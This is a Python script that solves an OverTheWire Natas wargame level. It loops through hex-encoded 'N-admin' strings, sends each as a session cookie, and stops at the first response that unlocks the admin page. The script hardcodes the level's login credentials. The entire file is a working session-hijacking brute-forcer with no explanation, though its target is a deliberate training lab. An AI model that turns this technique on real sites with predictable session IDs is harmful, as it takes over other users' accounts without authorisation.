import requests
import binascii

main = "http://natas19.natas.labs.overthewire.org"

session = requests.Session()
session.auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

for i in range(640):
    tmp = str(i) + "-admin"
    val = binascii.hexlify(tmp.encode('utf-8'))

    cookies = dict(PHPSESSID=val.decode('ascii'))
    response = session.get(main, cookies=cookies)
    if "Login as an admin to retrieve credentials" in response.text:
        pass
    else:
        print(response.text)
        break


